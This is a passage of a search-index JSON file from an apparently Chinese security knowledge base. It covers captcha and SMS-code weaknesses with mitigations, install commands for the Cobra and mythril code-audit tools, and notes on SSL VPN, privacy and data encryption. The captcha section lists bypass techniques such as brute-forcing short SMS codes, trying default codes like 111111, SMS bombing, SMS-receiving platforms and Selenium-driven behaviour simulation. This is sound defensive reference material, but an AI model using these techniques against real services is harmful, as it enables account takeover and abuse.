\u9a8c\u8bc1\u7801\u540e\u7aef\u6821\u9a8c\uff0c\u4e14\u4f7f\u7528\u4e00\u6b21\u540e\u8981\u6c42\u7acb\u5373\u5931\u6548\u3002 \u9a8c\u8bc1\u7801\u5728\u4e0d\u540c\u573a\u666f\u4e0b\u9700\u8981\u4e0e\u8bf7\u6c42\u7684\u53c2\u6570\u4e00\u8d77\u63d0\u4ea4\u7ed9\u540e\u7aef\u8fdb\u884c\u6821\u9a8c\uff0c\u4e14\u4f18\u5148\u6821\u9a8c\u9a8c\u8bc1\u7801\u3002","title":"\u5982\u4f55\u8bbe\u8ba1\u4e00\u4e2a\u5b89\u5168\u7684\u56fe\u5f62\u9a8c\u8bc1\u7801"},{"location":"captcha_security/captcha/#_10","text":"","title":"\u77ed\u4fe1\u9a8c\u8bc1\u7801"},{"location":"captcha_security/captcha/#_11","text":"\u77ed\u4fe1\u9a8c\u8bc1\u7801\u592a\u7b80\u5355\u3001\u77ed\u4fe1\u9a8c\u8bc1\u7801\u65f6\u6548\u98ce\u9669\uff1a\u4e00\u822c4\u4f4d\u7684\u77ed\u4fe1\u9a8c\u8bc1\u7801\u53ef\u4ee5\u572810\u5206\u949f\u5185\u66b4\u529b\u7834\u89e3\u6210\u529f\u3002 \u77ed\u4fe1\u9a8c\u8bc1\u7801\u4e0d\u4e0e\u624b\u673a\u53f7\u7ed1\u5b9a\u3002 \u77ed\u4fe1\u9a8c\u8bc1\u7801\u5185\u5bb9\u8fd4\u56de\u5728response\u6570\u636e\u5305\u4e2d\u3002 \u4e07\u80fd\u77ed\u4fe1\u9a8c\u8bc1\u7801\uff1a111111\u3001000000\u3001666666\u3001888888\u3002 \u77ed\u4fe1\u70b8\u5f39\u653b\u51fb\uff1a\u7531\u4e8e\u53d1\u9001\u77ed\u4fe1\u63a5\u53e3\u6ca1\u6709\u8bbe\u7f6e\u9891\u6b21\u4e0a\u9650\u5bfc\u81f4\u3002 \u77ed\u4fe1\u5185\u5bb9\u81ea\u5b9a\u4e49\uff1a\u5e38\u51fa\u73b0\u5728\u4e00\u4e9b\u53d1\u9001\u77ed\u4fe1\u7684\u540e\u7aef\u7ba1\u7406\u7cfb\u7edf\u4e2d\uff0c\u5bb9\u6613\u51fa\u73b0\u7c7b\u4f3c\u9493\u9c7c\u7b49\u7c7b\u578b\u7684\u653b\u51fb\u3002 \u77ed\u4fe1\u5e73\u53f0\u81ea\u8eab\u95ee\u9898\uff1a\u88ab\u5165\u4fb5\u3002 \u76d1\u542c\uff1a\u8fd0\u8425\u5546\u4e0a\u884c\u4e0e\u4e0b\u884c\u53ef\u80fd\u51fa\u73b0\u7684\u76d1\u542c\u3001\u4f2a\u57fa\u7ad9\u3001GSM\u3002 \u624b\u673a\u6728\u9a6c\u3001APP Content Provider\u8bbe\u8ba1\u7f3a\u9677\u3001\u77ed\u4fe1\u540c\u6b65\u5230\u4e91\u5e73\u53f0\u5bfc\u81f4\u6cc4\u6f0f\u3002","title":"\u77ed\u4fe1\u9a8c\u8bc1\u7801\u7684\u98ce\u9669"},{"location":"captcha_security/captcha/#_12","text":"\u8bf7\u6c42\u83b7\u53d6\u77ed\u4fe1\u63a5\u53e3\u6dfb\u52a0\u56fe\u5f62\u9a8c\u8bc1\u7801\u3002 \u5355\u4f4d\u65f6\u95f4\u5185\uff1a\u5355\u4e2aIP\u3001\u5355\u4e2a\u624b\u673a\u53f7\u8bbe\u7f6e\u8bf7\u6c42\u9650\u5236\uff0c\u5177\u4f53\u9700\u8981\u6839\u636e\u573a\u666f\u800c\u5b9a\u3002 \u5355\u4e2a\u624b\u673a\u53f7\u6bcf\u65e5\u77ed\u4fe1\u9a8c\u8bc1\u7801\u83b7\u53d6\u4e0a\u9650\u3002 \u53d1\u9001\u77ed\u4fe1\u63a5\u53e3\u5730\u5740\u767d\u540d\u5355\u3002","title":"\u5b89\u5168\u7684\u77ed\u4fe1\u9a8c\u8bc1\u7801"},{"location":"captcha_security/captcha/#_13","text":"","title":"\u8bed\u97f3\u9a8c\u8bc1\u7801"},{"location":"captcha_security/captcha/#_14","text":"\u547c\u53eb\u8f6c\u79fb\u3002 \u8bed\u97f3\u9a8c\u8bc1\u7801\u6210\u672c\u592a\u9ad8\u3002","title":"\u8bed\u97f3\u9a8c\u8bc1\u7801\u7684\u98ce\u9669"},{"location":"captcha_security/captcha/#_15","text":"Google reCaptcha\uff1a\u76ee\u524d\u5df2\u7ecf\u66f4\u65b0\u5230 \u7b2c\u4e09\u4ee3 \u6ed1\u52a8\u9a8c\u8bc1\u7801 \u70b9\u9009\u9a8c\u8bc1\u7801","title":"\u65b0\u4e00\u4ee3\u9a8c\u8bc1\u7801"},{"location":"captcha_security/captcha/#_16","text":"","title":"\u65b0\u4e00\u4ee3\u9a8c\u8bc1\u7801\u7684\u98ce\u9669"},{"location":"captcha_security/captcha/#_17","text":"\u5728\u7ebf\u63a5\u53d7\u77ed\u4fe1 \u6613\u7801\u5e73\u53f0","title":"\u63a5\u7801\u5e73\u53f0"},{"location":"captcha_security/captcha/#_18","text":"Python Selenium","title":"\u7528\u6237\u884c\u4e3a\u6a21\u62df"},{"location":"code_audit/cobra/","text":"Cobra\u4ee3\u7801\u5ba1\u8ba1\u5de5\u5177 cobra GitHub\u5730\u5740 Centos7\u5b89\u88c5\u4e0e\u4f7f\u7528Cobra cobra\u5b89\u88c5\u6587\u6863 # \u89e3\u51b3\u4f9d\u8d56 yum install flex.x86_64 bison.x86_64 bzip2.x86_64 bzip2-devel.x86_64 -y # \u5b89\u88c5phantomjs yum install glibc.x86_64 fontconfig.x86_64 fontconfig-devel.x86_64 freetype.x86_64 freetype-devel.x86_64 wget.x86_64 bzip2.x86_64 -y wget https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-2.1.1-linux-x86_64.tar.bz2 tar xvjf phantomjs-2.1.1-linux-x86_64.tar.bz2 -C /usr/local/share/ ln -sf /usr/local/share/phantomjs-2.1.1-linux-x86_64/bin/phantomjs /usr/local/bin/phantomjs # \u4e0b\u8f7d\u4e0e\u5b89\u88c5cobra git clone https://github.com/WhaleShark-Team/cobra.git cd cobra Cobra\u4f7f\u7528 cobra \u547d\u4ee4\u884c\u4f7f\u7528\u6587\u6863","title":"Cobra\u4ee3\u7801\u5ba1\u8ba1\u5de5\u5177"},{"location":"code_audit/cobra/#cobra","text":"cobra GitHub\u5730\u5740","title":"Cobra\u4ee3\u7801\u5ba1\u8ba1\u5de5\u5177"},{"location":"code_audit/cobra/#centos7cobra","text":"cobra\u5b89\u88c5\u6587\u6863 # \u89e3\u51b3\u4f9d\u8d56 yum install flex.x86_64 bison.x86_64 bzip2.x86_64 bzip2-devel.x86_64 -y # \u5b89\u88c5phantomjs yum install glibc.x86_64 fontconfig.x86_64 fontconfig-devel.x86_64 freetype.x86_64 freetype-devel.x86_64 wget.x86_64 bzip2.x86_64 -y wget https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-2.1.1-linux-x86_64.tar.bz2 tar xvjf phantomjs-2.1.1-linux-x86_64.tar.bz2 -C /usr/local/share/ ln -sf /usr/local/share/phantomjs-2.1.1-linux-x86_64/bin/phantomjs /usr/local/bin/phantomjs # \u4e0b\u8f7d\u4e0e\u5b89\u88c5cobra git clone https://github.com/WhaleShark-Team/cobra.git cd cobra","title":"Centos7\u5b89\u88c5\u4e0e\u4f7f\u7528Cobra"},{"location":"code_audit/cobra/#cobra_1","text":"cobra \u547d\u4ee4\u884c\u4f7f\u7528\u6587\u6863","title":"Cobra\u4f7f\u7528"},{"location":"code_audit/solitity/","text":"\u667a\u80fd\u5408\u7ea6\u4ee3\u7801\u5ba1\u8ba1 \u4f7f\u7528mythril\u5ba1\u8ba1\u667a\u80fd\u5408\u7ea6 mythril \u5b89\u88c5solitity\u4f9d\u8d56 solidity sudo add-apt-repository ppa:ethereum/ethereum sudo apt-get update sudo apt-get install solc \u5b89\u88c5mythril sudo apt-get update sudo apt-get install -y software-properties-common sudo add-apt-repository -y ppa:ethereum/ethereum sudo apt-get update sudo apt-get install -y solc sudo apt-get install libssl-dev sudo apt-get install -y python3-pip=9.0.1-2 python3-dev sudo ln -s /usr/bin/python3 /usr/local/bin/python sudo apt-get install -y pandoc sudo apt-get install -y git pip3 install mythril \u4f7f\u7528mythril\u5206\u6790\u667a\u80fd\u5408\u7ea6\u4ee3\u7801 myth -x *.sol:contract -o markdown","title":"\u667a\u80fd\u5408\u7ea6\u4ee3\u7801\u5ba1\u8ba1"},{"location":"code_audit/solitity/#_1","text":"","title":"\u667a\u80fd\u5408\u7ea6\u4ee3\u7801\u5ba1\u8ba1"},{"location":"code_audit/solitity/#mythril","text":"mythril","title":"\u4f7f\u7528mythril\u5ba1\u8ba1\u667a\u80fd\u5408\u7ea6"},{"location":"code_audit/solitity/#solitity","text":"solidity sudo add-apt-repository ppa:ethereum/ethereum sudo apt-get update sudo apt-get install solc","title":"\u5b89\u88c5solitity\u4f9d\u8d56"},{"location":"code_audit/solitity/#mythril_1","text":"sudo apt-get update sudo apt-get install -y software-properties-common sudo add-apt-repository -y ppa:ethereum/ethereum sudo apt-get update sudo apt-get install -y solc sudo apt-get install libssl-dev sudo apt-get install -y python3-pip=9.0.1-2 python3-dev sudo ln -s /usr/bin/python3 /usr/local/bin/python sudo apt-get install -y pandoc sudo apt-get install -y git pip3 install mythril","title":"\u5b89\u88c5mythril"},{"location":"code_audit/solitity/#mythril_2","text":"myth -x *.sol:contract -o markdown","title":"\u4f7f\u7528mythril\u5206\u6790\u667a\u80fd\u5408\u7ea6\u4ee3\u7801"},{"location":"data_security/big_data_security_copy/","text":"\u5927\u6570\u636e\u5b89\u5168\u6838\u5fc3\u6280\u672f\uff08\u6458\u81eaCSDN\uff09 \u539f\u6587\u94fe\u63a5\uff1a \u5927\u6570\u636e\u5b89\u5168\u6838\u5fc3\u6280\u672f\u5206\u6790\uff1a\u6570\u636e\u91c7\u96c6\u5b58\u50a8\u5b89\u5168\u6280\u672f \u5927\u6570\u636e\u5b89\u5168\u6838\u5fc3\u6280\u672f\u5206\u6790\uff1a\u6570\u636e\u6316\u6398\u5b89\u5168\u6280\u672f \u5927\u6570\u636e\u5b89\u5168\u6838\u5fc3\u6280\u672f\u5206\u6790\uff1a\u6570\u636e\u53d1\u5e03\u5b89\u5168\u6280\u672f \u5927\u6570\u636e\u5b89\u5168\u6838\u5fc3\u6280\u672f\u5206\u6790\uff1a\u9632\u8303APT\u653b\u51fb 01 \u6570\u636e\u91c7\u96c6\u5b89\u5168\u6280\u672f 01.01 \u4f20\u8f93\u5b89\u5168 \u865a\u62df\u4e13\u7528\u7f51\u7edc\u5c06\u96a7\u9053\u6280\u672f\u3001\u534f\u8bae\u5c01\u88c5\u6280\u672f\u3001\u5bc6\u7801\u6280\u672f\u548c\u914d\u7f6e\u7ba1\u7406\u6280\u672f\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u91c7\u7528\u5b89\u5168\u901a\u9053\u6280\u672f\u5728\u6e90\u7aef\u548c\u76ee\u7684\u7aef\u5efa\u7acb\u5b89\u5168\u7684\u6570\u636e\u901a\u9053\uff0c\u901a\u8fc7\u5c06\u5f85\u4f20\u8f93\u7684\u539f\u59cb\u6570\u636e\u8fdb\u884c\u52a0\u5bc6\u548c\u534f\u8bae\u5c01\u88c5\u5904\u7406\u540e\u518d\u5d4c\u5957\u88c5\u5165\u53e6\u4e00\u79cd\u534f\u8bae\u7684\u6570\u636e\u62a5\u6587\u4e2d\uff0c\u50cf\u666e\u901a\u6570\u636e\u62a5\u6587\u4e00\u6837\u5728\u7f51\u7edc\u4e2d\u8fdb\u884c\u4f20\u8f93\u3002\u7ecf\u8fc7\u8fd9\u6837\u7684\u5904\u7406\uff0c\u53ea\u6709\u6e90\u7aef\u548c\u76ee\u7684\u7aef\u7684\u7528\u6237\u5bf9\u901a\u9053\u4e2d\u7684\u5d4c\u5957\u4fe1\u606f\u80fd\u591f\u8fdb\u884c\u89e3\u91ca\u548c\u5904\u7406\uff0c\u800c\u5bf9\u4e8e\u5176\u4ed6\u7528\u6237\u800c\u8a00\u53ea\u662f\u65e0\u610f\u4e49\u7684\u4fe1\u606f\u3002\u56e0\u6b64\uff0c\u91c7\u7528VPN\u6280\u672f\u53ef\u4ee5\u901a\u8fc7\u5728\u6570\u636e\u8282\u70b9\u4ee5\u53ca\u7ba1\u7406\u8282\u70b9\u4e4b\u95f4\u5e03\u8bbeVPN\u7684\u65b9\u5f0f\u6ee1\u8db3\u5b89\u5168\u4f20\u8f93\u7684\u9700\u6c42\u3002 \u591a\u5e74\u6765IPSec\u534f\u8bae\u4e00\u76f4\u88ab\u8ba4\u4e3a\u662f\u6784\u5efaVPN\u6700\u597d\u7684\u9009\u62e9\uff0c\u4ece\u7406\u8bba\u4e0a\u6765\u8bb2IPSec\u534f\u8bae\u63d0\u4f9b\u4e86\u7f51\u7edc\u5c42\u4e4b\u4e0a\u6240\u6709\u534f\u8bae\u7684\u5b89\u5168\u3002\u7136\u800c\u56e0\u4e3aIPSec\u534f\u8bae\u7684\u590d\u6742\u6027\uff0c\u4f7f\u5176\u5f88\u96be\u6ee1\u8db3\u6784\u5efaVPN\u8981\u6c42\u7684\u7075\u6d3b\u6027\u548c\u53ef\u6269\u5c55\u5c5e\u6027\u3002SSL VPN\u51ed\u501f\u5176\u7b80\u5355\u3001\u7075\u6d3b\u3001\u5b89\u5168\u7684\u7279\u70b9\uff0c\u5f97\u5230\u4e86\u8fc5\u901f\u7684\u53d1\u5c55\uff0c\u5c24\u5176\u5728\u5927\u6570\u636e\u73af\u5883\u4e0b\u7684\u8fdc\u7a0b\u63a5\u5165\u8bbf\u95ee\u5e94\u7528\u65b9\u9762\uff0cSSL VPN\u5177\u6709\u5f88\u660e\u663e\u7684\u4f18\u52bf\u3002 01.02 SSL VPN SSL VPN\u91c7\u7528\u6807\u51c6\u7684\u5b89\u5168\u5957\u63a5\u5c42\u534f\u8bae\uff0c\u57fa\u4e8eX.509\u8bc1\u4e66\uff0c\u652f\u6301\u591a\u79cd\u52a0\u5bc6\u7b97\u6cd5\u3002\u53ef\u4ee5\u63d0\u4f9b\u57fa\u4e8e\u5e94\u7528\u5c42\u7684\u8bbf\u95ee\u63a7\u5236\uff0c\u5177\u6709\u6570\u636e\u52a0\u5bc6\u3001\u5b8c\u6574\u6027\u68c0\u6d4b\u548c\u8ba4\u8bc1\u673a\u5236\uff0c\u800c\u4e14\u5ba2\u6237\u7aef\u65e0\u9700\u7279\u5b9a\u8f6f\u4ef6\u7684\u5b89\u88c5\uff0c\u66f4\u52a0\u5bb9\u6613\u914d\u7f6e\u548c\u7ba1\u7406\uff0c\u4ece\u800c\u964d\u4f4e\u7528\u6237\u7684\u603b\u6210\u672c\u5e76\u589e\u52a0\u8fdc\u7a0b\u7528\u6237\u7684\u5de5\u4f5c\u6548\u7387\u3002 SSL\u534f\u8bae\u662fNctscape\u516c\u53f81995\u5e74\u63a8\u51fa\u7684\u4e00\u79cd\u5b89\u5168\u901a\u4fe1\u534f\u8bae\u3002SSL\u534f\u8bae\u5efa\u7acb\u5728\u53ef\u9760\u7684TCP\u4f20\u8f93\u534f\u8bae\u4e4b\u4e0a\uff0c\u5e76\u4e14\u4e0e\u4e0a\u5c42\u534f\u8bae\u65e0\u5173\uff0c\u5404\u79cd\u5e94\u7528\u5c42\u534f\u8bae\uff08\u5982\uff1aHTTP/FTP/TELNET\u7b49\uff09\u80fd\u901a\u8fc7SSL\u534f\u8bae\u8fdb\u884c\u900f\u660e\u4f20\u8f93\u3002 SSL\u534f\u8bae\u63d0\u4f9b\u7684\u5b89\u5168\u8fde\u63a5\u5177\u6709\u4ee5\u4e0b3\u4e2a\u57fa\u672c\u7279\u70b9\uff1a \u8fde\u63a5\u662f\u4fdd\u5bc6\u7684\uff1a\u5bf9\u4e8e\u6bcf\u4e2a\u8fde\u63a5\u90fd\u6709\u4e00\u4e2a\u552f\u4e00\u7684\u4f1a\u8bdd\u5bc6\u94a5\uff0c\u91c7\u7528\u5bf9\u79f0\u5bc6\u7801\u4f53\u8d28\uff08\u5982\uff1aDES\u3001RC4\u7b49\uff09\u6765\u52a0\u5bc6\u6570\u636e\u3002 \u8fde\u63a5\u662f\u53ef\u9760\u7684\uff1a\u6d88\u606f\u7684\u4f20\u8f93\u91c7\u7528MAC\u7b97\u6cd5\uff08\u5982\uff1aMD5\u3001SHA\u7b49\uff09\u8fdb\u884c\u5b8c\u6574\u6027\u6821\u9a8c\u3002 \u5bf9\u7aef\u5b9e\u4f53\u7684\u9274\u522b\u91c7\u7528\u975e\u5bf9\u79f0\u79d8\u5bc6\u4f53\u5236\uff08\u5982\uff1aRSA\u3001DSS\u7b49\uff09\u8fdb\u884c\u8ba4\u8bc1\u3002 SSL VPN\u7cfb\u7edf\u7684\u7ec4\u6210\u6309\u529f\u80fd\u53ef\u5206\u4e3aSSL VPN\u670d\u52a1\u5668\u548cSSL VPN\u5ba2\u6237\u7aef\u3002SSL VPN\u670d\u52a1\u5668\u662f\u516c\u5171\u7f51\u7edc\u8bbf\u95ee\u79c1\u6709\u5c40\u57df\u7f51\u7684\u6865\u6881\uff0c\u5b83\u4fdd\u62a4\u4e86\u5c40\u57df\u7f51\u5185\u7684\u62d3\u6251\u7ed3\u6784\u4fe1\u606f\u3002SSL VPN\u5ba2\u6237\u7aef\u662f\u8fd0\u884c\u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e0a\u7684\u7a0b\u5e8f\uff0c\u5b83\u4e3a\u8fdc\u7a0b\u8ba1\u7b97\u673a\u901a\u8fc7\u516c\u5171\u7f51\u7edc\u8bbf\u95ee\u79c1\u6709\u5c40\u57df\u7f51\u63d0\u4f9b\u4e00\u4e2a\u5b89\u5168\u901a\u9053\uff0c\u4f7f\u5f97\u8fdc\u7a0b\u8ba1\u7b97\u673a\u53ef\u4ee5\u5b89\u5168\u5730\u8bbf\u95ee\u79c1\u6709\u5c40\u57df\u7f51\u5185\u7684\u8d44\u6e90\u3002SSL VPN\u670d\u52a1\u5668\u7684\u4f5c\u7528\u76f8\u5f53\u4e8e\u4e00\u4e2a\u7f51\u5173\uff0c\u5b83\u62e5\u6709\u4e24\u79cdIP\u5730\u5740\uff1a\u4e00\u79cdIP\u5730\u5740\u7684\u7f51\u6bb5\u548c\u79c1\u6709\u5c40\u57df\u7f51\u5728\u540c\u4e00\u4e2a\u7f51\u6bb5\uff0c\u5e76\u4e14\u76f8\u5e94\u7684\u7f51\u5361\u76f4\u63a5\u8fde\u5728\u5c40\u57df\u7f51\u4e0a\uff1b\u53e6\u4e00\u79cdIP\u5730\u5740\u662f\u5408\u6cd5\u7533\u8bf7\u7684\u4e92\u8054\u7f51\u5730\u5740\uff0c\u5e76\u4e14\u76f8\u5e94\u7684\u7f51\u5361\u8fde\u63a5\u5230\u516c\u5171\u7f51\u7edc\u4e0a\u3002 \u5728SSL VPN\u5ba2\u6237\u7aef\uff0c\u9700\u8981\u9488\u5bf9\u5176\u4ed6\u5e94\u7528\u5b9e\u73b0SSL VPN\u5ba2\u6237\u7aef\u7a0b\u5e8f\uff0c\u8fd9\u79cd\u7a0b\u5e8f\u9700\u8981\u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u5b89\u88c5\u548c\u914d\u7f6e\u3002SSL VPN\u5ba2\u6237\u7aef\u7a0b\u5e8f\u7684\u89d2\u8272\u76f8\u5f53\u4e8e\u4e00\u4e2a\u4ee3\u7406\u5ba2\u6237\u7aef\uff0c\u5f53\u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u8bbf\u95ee\u5c40\u57df\u7f51\u5185\u7684\u8d44\u6e90\u65f6\uff0c\u5b83\u5c31\u5411SSL VPN\u5ba2\u6237\u7aef\u7a0b\u5e8f\u53d1\u51fa\u8bf7\u6c42\uff0cSSL VPN\u5ba2\u6237\u7aef\u518d\u4e0eSSL VPN\u670d\u52a1\u5668\u5efa\u7acb\u5b89\u5168\u901a\u9053\uff0c\u7136\u540e\u8f6c\u53d1\u5e94\u7528\u7a0b\u5e8f\u5e76\u5728\u5c40\u57df\u7f51\u5185\u8fdb\u884c\u901a\u4fe1\u3002 02 \u6570\u636e\u5b58\u50a8\u5b89\u5168\u6280\u672f 02.01 \u9690\u79c1\u4fdd\u62a4 \u4e00\u822c\u6765\u8bf4\uff0c\u4ece\u9690\u79c1\u6240\u6709\u8005\u7684\u89d2\u5ea6\u800c\u8a00\uff0c\u9690\u79c1\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b\uff1a \u4e2a\u4eba\u9690\u79c1\uff1a\u4efb\u4f55\u53ef\u4ee5\u786e\u8ba4\u7279\u5b9a\u4e2a\u4eba\u6216\u53ef\u786e\u8ba4\u7684\u4e2a\u4eba\u76f8\u5173\u3001\u4f46\u4e2a\u4eba\u4e0d\u613f\u88ab\u66b4\u9732\u7684\u4fe1\u606f\uff0c\u90fd\u53eb\u4e2a\u4eba\u9690\u79c1\uff0c\u5982\uff1a\u8eab\u4efd\u8bc1\u53f7\u3001\u5c31\u8bca\u8bb0\u5f55\u7b49\u3002 \u5171\u540c\u9690\u79c1\uff1a\u5171\u540c\u9690\u79c1\u4e0d\u4ec5\u5305\u542b\u4e2a\u4eba\u7684\u9690\u79c1\uff0c\u8fd8\u5305\u542b\u6240\u6709\u4e2a\u4eba\u5171\u540c\u8868\u73b0\u51fa\u4f46\u4e0d\u613f\u88ab\u66b4\u9732\u7684\u4fe1\u606f\uff0c\u5982\uff1a\u516c\u53f8\u5458\u5de5\u7684\u5e73\u5747\u85aa\u8d44\u3001\u85aa\u8d44\u5206\u5e03\u7b49\u4fe1\u606f\u3002 \u9690\u79c1\u4fdd\u62a4\u6280\u672f\u4e3b\u8981\u4fdd\u62a4\u4ee5\u4e0b\u4e24\u4e2a\u65b9\u9762\u7684\u5185\u5bb9\uff1a \u5982\u4f55\u4fdd\u8bc1\u6570\u636e\u5e94\u7528\u8fc7\u7a0b\u4e2d\u4e0d\u6cc4\u9732\u9690\u79c1\uff1b \u5982\u4f55\u66f4\u6709\u5229\u4e8e\u6570\u636e\u7684\u5e94\u7528\uff1b \u9690\u79c1\u4fdd\u62a4\u6280\u672f\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b3\u7c7b\uff1a 02.01.01 \u57fa\u4e8e\u6570\u636e\u4ea4\u6362\u7684\u9690\u79c1\u4fdd\u62a4\u6280\u672f \u6240\u8c13\u6570\u636e\u53d8\u6362\uff0c\u7b80\u5355\u7684\u8bb2\u5c31\u662f\u5bf9\u654f\u611f\u5c5e\u6027\u8fdb\u884c\u8f6c\u6362\uff0c\u4f7f\u539f\u59cb\u6570\u636e\u90e8\u5206\u5931\u771f\uff0c\u4f46\u662f\u540c\u65f6\u4fdd\u6301\u67d0\u4e9b\u6570\u636e\u6216\u6570\u636e\u5c5e\u6027\u4e0d\u53d8\u7684\u4fdd\u62a4\u65b9\u6cd5\uff0c\u6570\u636e\u5931\u771f\u6280\u672f\u901a\u8fc7\u5e72\u6270\u539f\u59cb\u6570\u636e\u6765\u5b9e\u73b0\u9690\u79c1\u4fdd\u62a4\u3002 02.01.02 \u57fa\u4e8e\u6570\u636e\u52a0\u5bc6\u7684\u9690\u79c1\u4fdd\u62a4\u6280\u672f \u91c7\u7528\u5bf9\u79f0\u6216\u975e\u5bf9\u79f0\u52a0\u5bc6\u6280\u672f\u5728\u6570\u636e\u6316\u6398\u8fc7\u7a0b\u4e2d\u9690\u85cf\u654f\u611f\u6570\u636e\uff0c\u591a\u7528\u4e8e\u5206\u5e03\u5f0f\u5e94\u7528\u73af\u5883\u4e2d\uff0c\u5982\u5206\u5e03\u5f0f\u6570\u636e\u6316\u6398\u3001\u5206\u5e03\u5f0f\u5b89\u5168\u67e5\u8be2\u3001\u51e0\u4f55\u8ba1\u7b97\u3001\u79d1\u5b66\u8ba1\u7b97\u7b49\u3002\u5206\u5e03\u5f0f\u5e94\u7528\u4e00\u822c\u91c7\u7528\u4e24\u79cd\u6a21\u5f0f\u5b58\u50a8\u6570\u636e\uff1a\u5782\u76f4\u5212\u5206\u548c\u6c34\u5e73\u5212\u5206\u7684\u6570\u636e\u6a21\u5f0f\u3002\u5782\u76f4\u5212\u5206\u6570\u636e\u662f\u6307\u5206\u5e03\u5f0f\u73af\u5883\u4e2d\u6bcf\u4e2a\u7ad9\u70b9\u53ea\u5b58\u50a8\u90e8\u5206\u5c5e\u6027\u7684\u6570\u636e\uff0c\u6240\u6709\u7ad9\u70b9\u5b58\u50a8\u7684\u6570\u636e\u4e0d\u91cd\u590d\u3002\u6c34\u5e73\u5212\u5206\u6570\u636e\u662f\u5c06\u6570\u636e\u8bb0\u5f55\u5b58\u50a8\u5230\u5206\u5e03\u5f0f\u73af\u5883\u4e2d\u7684\u591a\u4e2a\u7ad9\u70b9\uff0c\u6240\u6709\u7ad9\u70b9\u5b58\u50a8\u7684\u6570\u636e\u4e0d\u91cd\u590d\u3002 02.01.03 \u57fa\u4e8e\u533f\u540d\u5316\u7684\u9690\u79c1\u4fdd\u62a4\u6280\u672f \u533f\u540d\u5316\u662f\u6307\u6839\u636e\u5177\u4f53\u60c5\u51b5\u6709\u6761\u4ef6\u5730\u53d1\u5e03\u6570\u636e\u3002\u5982\u4e0d\u53d1\u5e03\u6570\u636e\u7684\u67d0\u4e9b\u57df\u503c\u3001\u6570\u636e\u6cdb\u5316\u7b49\u3002\u9650\u5236\u53d1\u5e03\u5373\u6709\u9009\u62e9\u7684\u53d1\u5e03\u539f\u59cb\u6570\u636e\u3001\u4e0d\u53d1\u5e03\u6216\u8005\u53d1\u5e03\u7cbe\u5ea6\u8f83\u4f4e\u7684\u654f\u611f\u6570\u636e\uff0c\u4ee5\u5b9e\u73b0\u9690\u79c1\u4fdd\u62a4\u3002\u6570\u636e\u533f\u540d\u5316\u4e00\u822c\u91c7\u7528\u4e24\u79cd\u57fa\u672c\u64cd\u4f5c\uff1a \u6291\u5236\uff1a\u6291\u5236\u67d0\u6570\u636e\u9879\uff0c\u5373\u4e0d\u53d1\u5e03\u8be5\u6570\u636e\u9879\u3002 \u6cdb\u5316\uff1a\u6cdb\u5316\u662f\u5bf9\u6570\u636e\u8fdb\u884c\u6982\u51b5\u3001\u62bd\u8c61\u7684\u63cf\u8ff0\u3002\u8b6c\u5982\uff0c\u5bf9\u6574\u65705\u7684\u4e00\u79cd\u6cdb\u5316\u5f62\u5f0f\u662f[3,6]\uff0cW\u4e3a5\u5728\u533a\u95f4[3,6]\u5185\u3002 02.02 \u6570\u636e\u52a0\u5bc6 \u5927\u6570\u636e\u73af\u5883\u4e0b\uff0c\u6570\u636e\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b\uff1a\u9759\u6001\u6570\u636e\u548c\u52a8\u6001\u6570\u636e\u3002 \u9759\u6001\u6570\u636e\u662f\u6307\uff1a\u6587\u6863\u3001\u62a5\u8868\u3001\u8d44\u6599\u7b49\u4e0d\u53c2\u4e0e\u8ba1\u7b97\u7684\u6570\u636e\uff1b \u52a8\u6001\u6570\u636e\u662f\u6307\u9700\u8981\u68c0\u7d22\u6216\u53c2\u4e0e\u8ba1\u7b97\u7684\u6570\u636e\u3002 \u4f7f\u7528SSL VPN\u53ef\u4ee5\u4fdd\u8bc1\u6570\u636e\u4f20\u8f93\u7684\u5b89\u5168\uff0c\u4f46\u5b58\u50a8\u7cfb\u7edf\u8981\u5148\u89e3\u5bc6\u6570\u636e\uff0c\u7136\u540e\u8fdb\u884c\u5b58\u50a8\uff0c\u5f53\u6570\u636e\u4ee5\u660e\u6587\u7684\u65b9\u5f0f\u5b58\u50a8\u5728\u7cfb\u7edf\u4e2d\u65f6\uff0c\u9762\u5bf9\u672a\u88ab\u6388\u6743\u5165\u4fb5\u8005\u7684\u7834\u574f\u3001\u4fee\u6539\u548c\u91cd\u653e\u653b\u51fb\u663e\u5f97\u5f88\u8106\u5f31\uff0c\u5bf9\u91cd\u8981\u6570\u636e\u7684\u5b58\u50a8\u52a0\u5bc6\u662f\u5fc5\u987b\u91c7\u53d6\u7684\u6280\u672f\u624b\u6bb5\u3002 02.02.01 \u9759\u6001\u6570\u636e\u52a0\u5bc6\u673a\u5236 02.02.01.01 \u6570\u636e\u52a0\u5bc6\u7b97\u6cd5 \u6570\u636e\u52a0\u5bc6\u7b97\u6cd5\u5206\u4e3a\u4e24\u7c7b\uff0c\u5bf9\u79f0\u52a0\u5bc6\u548c\u975e\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u3002\u5b9e\u9645\u5de5\u7a0b\u4e2d\u5e38\u7528\u7684\u89e3\u51b3\u529e\u6cd5\u662f\u5bf9\u79f0\u548c\u975e\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u7ed3\u5408\u8d77\u6765\uff0c\u5229\u7528\u975e\u5bf9\u79f0\u5bc6\u94a5\u4f53\u7cfb\u8fdb\u884c\u5bc6\u94a5\u5206\u914d\uff0c\u5229\u7528\u5bf9\u79f0\u5bc6\u94a5\u52a0\u5bc6\u7b97\u6cd5\u8fdb\u884c\u6570\u636e\u7684\u52a0\u5bc6\uff0c\u5c24\u5176\u662f\u5728\u5927\u6570\u636e\u73af\u5883\u4e0b\uff0c\u52a0\u5bc6\u5927\u91cf\u7684\u6570\u636e\u65f6\uff0c\u8fd9\u79cd\u7ed3\u5408\u5c24\u5176\u91cd\u8981\u3002 02.02.01.02 \u52a0\u5bc6\u8303\u56f4 